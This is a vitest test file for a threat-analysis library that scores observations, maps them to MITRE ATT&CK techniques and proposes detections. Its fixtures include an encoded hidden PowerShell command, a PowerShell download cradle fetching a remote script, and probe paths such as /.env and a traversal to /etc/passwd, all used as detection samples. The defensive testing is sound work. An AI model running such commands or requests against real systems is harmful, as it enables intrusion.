import { describe, expect, it } from "vitest";
import { makeObservation } from "@/lib/extraction";
import type { Observation } from "@/types/objects";
import {
  runAnalysis,
  weightObservations,
  reason,
  attachConfidence,
  explanationFor,
  mapFindings,
  techniqueInfo,
  buildOpportunities,
  buildRecommendations,
  assessQuality,
  STRONG,
} from "@/lib/analysis";

const TS = "2026-08-07T12:00:00.000Z";

function scenario(): Observation[] {
  return [
    makeObservation({ kind: "command", value: "powershell.exe -NoP -W Hidden -EncodedCommand SQBFAFgA", source: "t", ts: TS }),
    makeObservation({ kind: "command", value: "powershell.exe -Command (New-Object System.Net.WebClient).DownloadString('http://198.51.100.23/a.ps1')", source: "t", ts: TS }),
    makeObservation({ kind: "url", value: "http://198.51.100.23/a.ps1", source: "t", meta: { host: "198.51.100.23", scheme: "http", path: "/a.ps1" }, ts: TS }),
    makeObservation({ kind: "ip", value: "198.51.100.23", source: "t", meta: { from: "url" }, ts: TS }),
    makeObservation({ kind: "hash", value: "a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b2", source: "t", meta: { hashType: "sha256" }, ts: TS }),
    makeObservation({ kind: "email", value: "user@evil.tk", source: "t", ts: TS }),
  ];
}

describe("evidence weighting", () => {
  it("scores encoded commands strong with rationale", () => {
    const [w] = weightObservations(scenario());
    expect(w.score).toBeGreaterThanOrEqual(STRONG);
    expect(w.rationale.length).toBeGreaterThan(0);
  });

  it("scores download cradles above encoded commands", () => {
    const weighted = weightObservations(scenario());
    const download = weighted.find((x) => /webclient/i.test(x.observation.value));
    const encoded = weighted.find((x) => /encodedcommand/i.test(x.observation.value));
    expect(download!.score).toBe(0.91);
    expect(encoded!.score).toBe(0.88);
  });

  it("scores neutral facts low", () => {
    const [w] = weightObservations([makeObservation({ kind: "domain", value: "example.com", source: "t", ts: TS })]);
    expect(w.score).toBe(0.1);
    expect(w.rationale[0]).toBe("Recorded fact");
  });

  it("floors anomalous Zeek conn-states at the rule severity band", () => {
    const [w] = weightObservations([
      makeObservation({ kind: "string", value: "REJ 10.2.3.4 → 45.155.205.233", source: "t", meta: { attr: "zeek-conn-state", state: "REJ", src: "10.2.3.4", dst: "45.155.205.233" }, ts: TS }),
    ]);
    expect(w.score).toBeGreaterThanOrEqual(0.6);
    expect(w.rationale.some((r) => r.includes("REJ"))).toBe(true);
  });

  it("floors HTTP error and probe-path observations", () => {
    const [err, probe] = weightObservations([
      makeObservation({ kind: "string", value: "GET /missing", source: "t", meta: { attr: "http-request", method: "GET", path: "/missing", status: "500" }, ts: TS }),
      makeObservation({ kind: "string", value: "GET /.env", source: "t", meta: { attr: "http-request", method: "GET", path: "/.env", status: "200" }, ts: TS }),
    ]);
    expect(err.score).toBeGreaterThanOrEqual(0.6);
    expect(probe.score).toBeGreaterThanOrEqual(0.8);
    expect(probe.rationale.some((r) => r.includes("probing"))).toBe(true);
  });
});

describe("threat reasoning", () => {
  it("emits hypotheses with observation refs, not verdict strings", () => {
    const findings = reason(weightObservations(scenario()));
    const titles = findings.map((f) => f.title);
    expect(titles).toContain("Initial payload retrieval");
    expect(titles).toContain("Encoded PowerShell command");
    expect(titles).toContain("Suspicious sender domain");
    for (const f of findings) {
      expect(f.observations!.length).toBeGreaterThan(0);
      expect(f.confidence?.level).toBe("unknown");
    }
  });

  it("is deterministic", () => {
    expect(reason(weightObservations(scenario()))).toEqual(reason(weightObservations(scenario())));
  });

  it("raises findings for anomalous Zeek conn-states with technique refs", () => {
    const findings = reason(
      weightObservations([
        makeObservation({ kind: "string", value: "REJ 10.2.3.4 → 45.155.205.233", source: "t", meta: { attr: "zeek-conn-state", state: "REJ", src: "10.2.3.4", dst: "45.155.205.233" }, ts: TS }),
        makeObservation({ kind: "string", value: "SF 10.2.3.4 → 8.8.8.8", source: "t", meta: { attr: "zeek-conn-state", state: "SF", src: "10.2.3.4", dst: "8.8.8.8" }, ts: TS }),
      ]),
    );
    const rej = findings.find((f) => f.title === "Connection attempt rejected");
    expect(rej).toBeDefined();
    expect(rej?.severity).toBe("medium");
    expect(rej?.technique).toBe("T1046");
    expect(rej?.detail).toContain("10.2.3.4 → 45.155.205.233");
    expect(findings.some((f) => f.title === "Network Service Discovery")).toBe(false);
  });

  it("raises findings for Nginx error codes and probe paths", () => {
    const findings = reason(
      weightObservations([
        makeObservation({ kind: "string", value: "GET /wp-login.php", source: "t", meta: { attr: "http-request", method: "GET", path: "/wp-login.php", status: "401", client: "198.51.100.23" }, ts: TS }),
        makeObservation({ kind: "string", value: "GET /../../etc/passwd", source: "t", meta: { attr: "http-request", method: "GET", path: "/../../etc/passwd", status: "404", client: "198.51.100.23" }, ts: TS }),
        makeObservation({ kind: "string", value: "GET /ok", source: "t", meta: { attr: "http-request", method: "GET", path: "/ok", status: "200", client: "198.51.100.23" }, ts: TS }),
      ]),
    );
    const wp = findings.find((f) => f.title === "WordPress admin probing");
    expect(wp).toBeDefined();
    expect(wp?.severity).toBe("high");
    const traversal = findings.find((f) => f.title === "Path traversal attempt");
    expect(traversal).toBeDefined();
    expect(traversal?.severity).toBe("critical");
    const unauthorized = findings.find((f) => f.title === "Unauthorized request");
    expect(unauthorized).toBeDefined();
    expect(findings.some((f) => f.detail?.includes("/ok"))).toBe(false);
  });
});

describe("confidence", () => {
  it("is explained, reproducible, and level-mapped", () => {
    const weighted = weightObservations(scenario());
    const e1 = explanationFor(weighted);
    const e2 = explanationFor(weighted);
    expect(e1).toEqual(e2);
    expect(e1.level).toBe("high");
    expect(e1.contributors.length).toBeGreaterThan(3);
  });

  it("fills unknown findings with per-finding explanations", () => {
    const weighted = weightObservations(scenario());
    const findings = attachConfidence(reason(weighted), weighted);
    for (const f of findings) {
      expect(f.confidence?.level).not.toBe("unknown");
      expect(f.confidence?.contributors.length).toBeGreaterThan(0);
    }
  });
});

describe("mitre mapping", () => {
  it("produces a chain: technique → tactic → evidence refs → confidence", () => {
    const weighted = weightObservations(scenario());
    const findings = attachConfidence(reason(weighted), weighted);
    const mapped = mapFindings(findings);
    const ps = mapped.find((m) => m.technique === "T1059.001");
    expect(ps?.name).toBe("PowerShell");
    expect(ps?.tactic).toBe("Execution");
    expect(ps?.evidenceRefs.length).toBeGreaterThan(0);
    expect(ps?.confidence?.level).toBeDefined();
  });

  it("resolves names for every technique the analyzers emit (no id-as-name fallback)", () => {
    expect(techniqueInfo("T1105")).toMatchObject({ name: "Ingress Tool Transfer", tactic: "C2" });
    expect(techniqueInfo("T1583.001").name).toBe("Domains");
    expect(techniqueInfo("T1059.007").name).toBe("JavaScript");
    expect(techniqueInfo("T1571").name).toBe("Non-Standard Port");
    expect(techniqueInfo("T1572").name).toBe("Protocol Tunneling");
    expect(techniqueInfo("T1071.001").name).toBe("Web Protocols");
  });
});

describe("detection opportunities", () => {
  it("reports unknown coverage when no rule lookup is injected", () => {
    const weighted = weightObservations(scenario());
    const findings = attachConfidence(reason(weighted), weighted);
    const opps = buildOpportunities(findings);
    expect(opps.length).toBeGreaterThan(0);
    expect(opps.every((o) => o.coverage === "unknown")).toBe(true);
    expect(opps.every((o) => o.suggestedHunt)).toBe(true);
  });

  it("detects covered techniques via the injected lookup", () => {
    const weighted = weightObservations(scenario());
    const findings = attachConfidence(reason(weighted), weighted);
    const opps = buildOpportunities(findings, { lookupRule: (t) => (t === "T1105" ? "sigma-web-egress" : undefined) });
    expect(opps.find((o) => o.technique === "T1105")?.coverage).toBe("detected");
    expect(opps.find((o) => o.technique === "T1105")?.existingRule).toBe("sigma-web-egress");
    expect(opps.find((o) => o.technique === "T1059.001")?.coverage).toBe("gap");
    const gap = opps.find((o) => o.coverage === "gap");
    expect(gap?.suggestedRule?.fmt).toBe("sigma");
  });

  it("prioritizes by finding severity", () => {
    const weighted = weightObservations(scenario());
    const findings = attachConfidence(reason(weighted), weighted);
    const opps = buildOpportunities(findings);
    expect(opps.find((o) => o.technique === "T1059.001")?.priority).toBe("high");
    expect(opps.find((o) => o.technique === "T1105")?.priority).toBe("high");
    expect(opps.find((o) => o.technique === "T1566")?.priority).toBe("medium");
  });
});

describe("recommendations", () => {
  it("every recommendation references evidence", () => {
    const obs = scenario();
    const weighted = weightObservations(obs);
    const findings = attachConfidence(reason(weighted), weighted);
    const opps = buildOpportunities(findings);
    const recs = buildRecommendations(obs, findings, opps);
    expect(recs.length).toBeGreaterThan(0);
    for (const r of recs) expect(r.evidenceRefs.length).toBeGreaterThan(0);
    expect(recs.some((r) => r.kind === "enrich-ioc")).toBe(true);
  });
});

describe("quality", () => {
  it("scores coverage and recommends a next step", () => {
    const obs = scenario();
    const weighted = weightObservations(obs);
    const findings = attachConfidence(reason(weighted), weighted);
    const opps = buildOpportunities(findings);
    const recs = buildRecommendations(obs, findings, opps);
    const q = assessQuality(obs, weighted, findings, opps, recs);
    expect(q.coverage.score).toBeGreaterThan(0);
    expect(q.weakSignals).toEqual(["ip:198.51.100.23", "hash:a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b2"]);
    expect(q.conflictingSignals).toEqual([]);
    expect(q.recommendedNextStep.length).toBeGreaterThan(0);
    expect(q.missing).toContain("missing domain context");
    expect(q.notes[0]).toContain("correlation");
  });
});

describe("pipeline (runAnalysis)", () => {
  it("assembles all objects end-to-end, deterministically", () => {
    const a = runAnalysis(scenario(), { source: "e2e", ts: TS });
    const b = runAnalysis(scenario(), { source: "e2e", ts: TS });
    expect(a).toEqual(b);
    expect(a.findings.length).toBeGreaterThan(0);
    expect(a.mitre.length).toBeGreaterThan(0);
    expect(a.opportunities.length).toBeGreaterThan(0);
    expect(a.recommendations.length).toBeGreaterThan(0);
    expect(a.quality.coverage.score).toBeGreaterThan(0);
    for (const f of a.findings) expect(f.confidence?.level).not.toBe("unknown");
    for (const r of a.recommendations) expect(r.evidenceRefs.length).toBeGreaterThan(0);
  });

  it("builds graph edges: url→host supports, finding extracts, mapped-to", () => {
    const result = runAnalysis(scenario(), { source: "e2e", ts: TS });
    const relations = result.relationships.map((r) => r.relation);
    expect(relations).toContain("supports");
    expect(relations).toContain("extracts");
    expect(relations).toContain("mapped-to");
    const urlHost = result.relationships.find((r) => r.relation === "supports");
    expect(urlHost?.from.kind).toBe("ioc");
    expect(urlHost?.to.id).toBe(result.observations.find((o) => o.kind === "ip")?.id);
  });

  it("never writes UI state into objects", () => {
    const result = runAnalysis(scenario(), { source: "e2e", ts: TS });
    const blobs = [
      ...result.observations,
      ...result.findings,
      ...result.relationships,
      ...result.opportunities,
      ...result.recommendations,
      result.quality,
    ].map((o) => JSON.stringify(o));
    for (const blob of blobs) {
      expect(blob).not.toMatch(/"color"|"layout"|"className"|"order"/);
    }
  });

  it("honors injected rule lookup through the whole pipeline", () => {
    const result = runAnalysis(scenario(), {
      source: "e2e",
      ts: TS,
      opportunity: { lookupRule: (t) => (t === "T1059.001" ? "sigma-ps-encoded" : undefined) },
    });
    const ps = result.opportunities.find((o) => o.technique === "T1059.001");
    expect(ps?.coverage).toBe("detected");
    expect(ps?.existingRule).toBe("sigma-ps-encoded");
    expect(result.recommendations.some((r) => r.kind === "create-rule" && r.statement.includes("T1105"))).toBe(true);
  });

  it("thresholds: weak-only input yields low confidence, no opportunities", () => {
    const weak = [makeObservation({ kind: "ip", value: "203.0.113.9", source: "t", ts: TS })];
    const result = runAnalysis(weak, { source: "e2e", ts: TS });
    expect(result.findings).toHaveLength(0);
    expect(result.opportunities).toHaveLength(0);
    expect(result.quality.coverage.score).toBe(1 / 6);
    expect(result.quality.confidence).toBeUndefined();
  });
});
